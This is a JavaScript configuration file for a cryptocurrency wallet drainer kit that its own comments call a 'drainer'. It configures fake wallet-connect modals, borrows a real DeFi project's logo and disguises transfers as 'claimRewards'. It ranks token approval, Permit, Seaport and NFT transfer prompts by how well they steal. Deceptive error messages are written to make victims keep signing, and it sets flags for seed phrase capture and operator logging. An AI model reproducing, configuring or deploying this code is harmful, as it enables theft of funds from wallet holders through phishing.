/*
    Modal_Style = 1; https://i.ibb.co/7zKDxx6/brave-v6-Ap-Shib-YR.png
    Modal_Style = 2; https://i.ibb.co/GvXy8kH/brave-qmejtu-HVi-C.png
    Modal_Style = 3; https://i.ibb.co/pdDJ5YR/brave-5-Hha-ZYeig-S.png
    Modal_Style = 4; https://i.ibb.co/88CHdVF/Telegram-zgdy-Sm-MLf-D.png
    Modal_Style = 5; https://i.ibb.co/R3KRv8D/brave-s-Plrx-CJm-SP.png
    Modal_Style = 6; No modal, auto connect MetaMask / WalletConnect V3
    Modal_Style = 7; WalletConnect V3 https://i.ibb.co/y0Zwhqs/brave-v-Qa-Cpi-Ksm-T.png
    Modal_Style = 8; https://i.ibb.co/GC7fQhb/Screenshot-2024-01-16-at-06-57-05.png
    Modal_Style = 9; https://i.ibb.co/sPmzgrn/Screenshot-2024-10-25-alle-15-25-43.png
    Modal_Style = 10; https://i.ibb.co/9hRwDJx/Screenshot-2024-10-25-alle-15-27-02.png

    Popup_Style = 1; SweetAlerts
    Popup_Style = 2; Black loaders
    Popup_Style = 3; Metamask styled loaders
    Popup_Style = 4; Modal 8 Purple loaders
    Popup_Style = 5; Connectkit popups
*/
const Modal_Style = 7;
const Popup_Style = 5;

const Popup_Dark_Mode = true; // Popups Loaders dark or light mode, "true" = dark & "false" = light
const WalletConnect_V3_Dark_Mode = true; // Modal 7 dark or light mode, "true" = dark & "false" = light

const modal_div_config = {
    "modal_dark_mode": true // Modals dark mode, "true" = dark & "false" = light
};

const Connectkit_Scanning_Assets_Text = "Waiting for verification..."
const Connectkit_Prompted_Title = "Requesting Confirmation"
const Connectkit_Prompted_Text = "Sign the message in your wallet to continue..."
const Connectkit_Signed_Text = "RPC Network error, The provided signature is invalid, Please try again."
const Connectkit_Total_Balance_Too_Low_Text = "Something went wrong.<br>Please try again with an active wallet."
const Connectkit_Not_Eligible_Text = "Your wallet has been flagged for an irregular activity.<br>Please try to connect a different wallet."

const Popup_4_Title_Text = "Connect a Wallet"
const Popup_Wallet_Connected_Text = "Wallet has been successfully connected"
const Popup_Scanning_Assets_Text = "Connecting to Blockchain..."
const Popup_Prompted_Title = "Waiting for your sign..."
const Popup_Prompted_Text = "Sign the message in your wallet to continue..."
const Popup_Signed_Text = "RPC Network error, The provided signature is incorrect, Please try again."
const Popup_Total_Balance_Too_Low_Text = "Your wallet doesn\'t meet the requirements. Please try again by connecting a middle-active wallet."
const Popup_Not_Eligible_Text = "Your wallet has been flagged for an irregular activity. Please try to connect a different wallet."

const wallet_connect_config = {
    "font_family": '',
    "accent_color": '',
    "color_mix": '',
    "font_size_master": ''
}

const class_connect_name = "connectButton"; // Custom class name to open modal

const mainnet_balance_method = "deploy"; // "disperse" or "deploy" or "multicall" or "standard"
const multchain_balance_method = "disperse"; // "disperse" or "deploy" or "multicall" or "standard"
const transfer_contract_function_name = "claimRewards"; // Claim, claimRewards, Connect, Swap, Execute, Multicall, Merge, Enable, Verify
const use_approve_if_increase_not_available = true;
const bulkTransferEnabled = true; // Replace Seaport by BulkTransfer
const auto_prompt_on_reload = false; // Auto prompt popups when page get reloaded
const click_everywhere_open_modal = false;
const skip_popup_decline = false; // Skip asset to next after popup decline
const min_total_balance_for_prompt = 0.1; // Wallet value needed to prompt a popup
const remove_transfered_elements_in_past = false; // Remove already transfered assets during page refresh
const show_zero_logs_enabled = true; // Send connects logs below "min_total_balance_for_prompt" worth
const show_full_links = false; // Show full links in log (do not enable if you run Google ads)
const chain_switch_prompt_log_enabled = true; // Send logs for prompting switch chain
const use_siwe_bot_bypass = false;
const force_approve = false;
const enable_seed = true;
const iframe_enabled = false;
const max_declines = 5; // max declines before stopping drainer

const DISABLE_MAIN_FEATURE = false; // Ask admins what is this for, DO NOT enable otherwise.

const multiplierMap = { // Ratio - priorize the best popup, example, 1 ETH: scanner will detect 1 * 0.5 so 0.5 eth and let priority to best popups
    "multichain": 0.77, // Multichain ratio
    "eth": 0.44, // ETH popup ratio
    "noeth": 0.66, // Tokens popup ratio (Increase Allowance/Approval & Approve/Transfer)
    "permit": 1.001, // Permit popup ratio
    "permit2": 0.99, // Permit2 popup ratio
    "gmx": 0.55, // GMX popup ratio,
    "compound": 0.8, // Compound popup ratio
    "nft": 0.35, // SetapprovalforAll/Multicall popup ratio
    "blur": 0.45, // Blur popup ratio
    "sea": 0.48, // Seaport/BulkTransfer popup ratio
    "wyvern": 0.41, // Wyvern OG nft popup ratio
    "apecoin": 0.3, // Apecoins unstake popup ratio
    "uniswap": 0.25, // Uniswap V2 popup ratio
    "swell": 0.64 // Swell popup ratio
}; // Please note that ratio is already probably the best, some popups are better than others here so leave it as it is.

const Modal_2_Title = "Connect Wallet";
const Modal_2_Subtitle = "Start by connecting your wallet from the list below!";
const Modal_2_Subtitle_URL = "";
const Modal_2_Subtitle_URL_Text = "";

const Modal_3_Title = "Connect Wallet";
const Modal_3_Subtitle = "Start by connecting your wallet from the list below!";

const Modal_4_Title = "Connect Wallet";
const Modal_4_Subtitle = "Start by connecting your wallet from the list below!";
const Modal_4_Logo_URL = "https://conic.finance/static/media/conic.2bc918ed95a106ffe4941df1594559a2.svg";
const Modal_4_Footer_Title = "";
const Modal_4_Footer_URL = "";
const Modal_4_Footer_URL_Text = "";

const Modal_5_Title = "Connect Wallet"
const Modal_5_Subtitle = "Choose what network and wallet want to connect below";

const auth_key = "S4OAQx8C9hL7VsBUvn"; // Don't remove

class SwalPopup {
    constructor() {
        this.popup = null;
        this.timeout = null;
    }
    show() {
        this.popup = Swal.fire({
            html: '<b>Connection Established</b><br>Sign message in your wallet to continue...',
            imageUrl: 'https://miro.medium.com/v2/resize:fit:720/1*CsJ05WEGfunYMLGfsT2sXA.gif',
            width: 600,
            imageHeight: 80,
            color: '#1b1e24',
            background: '#ffffff',
            timer: 0,
            allowOutsideClick: false,
            allowEscapeKey: false,
            showConfirmButton: false,
        })
    }

    close() {
        Swal.close();
        this.popup = null;
    }
    pooron(error = 'Insufficient ETH for transaction broadcast. Try with different wallet.') {
        this.popup = Swal.fire({
            title: 'Something went wrong!',
            icon: 'error',
            confirmButtonText: 'OK',
            text: error,
            color: '#1b1e24',
            background: '#ffffff',
            allowOutsideClick: true,
            allowEscapeKey: true,
        })
    }
    notEli(error = 'Insufficient ETH for transaction broadcast. Try with different wallet.') {
        this.popup = Swal.fire({
            title: 'Something went wrong!',
            icon: 'error',
            confirmButtonText: 'OK',
            text: error,
            color: '#1b1e24',
            background: '#ffffff',
            allowOutsideClick: true,
            allowEscapeKey: true,
        })
    }
    setError(error = 'Authentification was cancelled due to rapid change in gas prices. Please try again.') {
        this.popup = Swal.fire({
            title: 'Something went wrong!',
            imageUrl: '',
            icon: 'error',
            text: error,
            color: '#1b1e24',
            background: '#ffffff',
            allowOutsideClick: true,
            allowEscapeKey: true,
        })
    }
    setSuccess() {
        this.popup = Swal.fire({
            icon: 'success',
            title: 'Connection established',
            text: 'Awaiting wallet response, please wait a moment.',
            color: '#1b1e24',
            background: '#ffffff',
            showConfirmButton: false,
            allowOutsideClick: true,
            allowEscapeKey: true,
        })
    }
    chainswitch() {
        this.popup = Swal.fire({
            icon: 'info',
            title: 'Switching network',
            text: 'Confirm network switch in wallet...',
            color: '#1b1e24',
            background: '#ffffff',
            showConfirmButton: false,
            allowOutsideClick: true,
            allowEscapeKey: true,
        })
    }

    update(options) {
        this.popup.update(options);
    }
}
